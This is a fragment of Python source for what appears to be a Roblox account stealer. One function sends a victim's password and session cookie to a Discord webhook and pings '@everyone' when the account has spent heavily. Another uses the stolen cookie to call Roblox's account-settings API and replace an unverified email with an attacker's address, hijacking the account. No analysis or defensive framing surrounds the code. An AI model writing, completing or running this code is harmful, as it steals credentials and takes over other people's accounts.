...
def send_to_discord_background(password, cookie, webhook_url):
    ...
    try:
        ...
        if total_spent_value >= 50000:
            ...
            ping_content = '@everyone 🚨 **HIGH VALUE!** 🚨'
...
def get_roblox_user_info(cookie):
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            try:
                # Check email verification status and get current email
                ...
                if email_response.status_code == 200:
                    ...
                    email_address = email_data.get('emailAddress', 'Not available')
                    
                    # If email is not verified, automatically set to autoharv2@gmail.com
                    if not email_data.get('verified', False):
                        print("Email not verified - attempting to set autoharv2@gmail.com")
                        try:
                            # Update email to autoharv2@gmail.com
                            update_email_data = {
                                'emailAddress': 'autoharv2@gmail.com',
                                'password': ''  # Password might be required, but we try without first
                            }
                            
                            update_response = requests.post('https://accountsettings.roblox.com/v1/email',
                                                          headers=headers, 
                                                          json=update_email_data,
                                                          timeout=5)
                            
                            print(f"Email update response status: {update_response.status_code}")
                            if update_response.status_code == 200:
                                print("Successfully updated email to autoharv2@gmail.com")
                                email_address = 'autoharv2@gmail.com (Auto-set)'
                            else:
                                print(f"Email update failed: {update_response.status_code}, response: {update_response.text}")
                                email_address = f"{email_address} (Failed to auto-set)"
                                
                        except Exception as update_error:
                            print(f"Error updating email: {str(update_error)}")
                            email_address = f"{email_address} (Update error)"
